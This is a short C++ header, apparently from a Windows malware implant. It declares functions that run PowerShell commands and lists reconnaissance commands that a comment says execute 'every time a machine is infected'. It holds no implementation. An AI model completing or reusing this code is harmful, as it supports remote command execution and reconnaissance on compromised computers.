#ifndef EXEC_SHELL
#define EXEC_SHELL


#define BUF_SIZE 4096

#include <windows.h>
#include <stdio.h>
#include <string>

//common commands executes every time a machine is infected
enum CommonCmd { whoami, pwd, ls, os_info, sys_info, cpu_num };

// cmd should be in the format of "powershell /c COMMAND"
std::string exec_shell(char* cmd);
std::string exec_shell(CommonCmd cmd);

#endif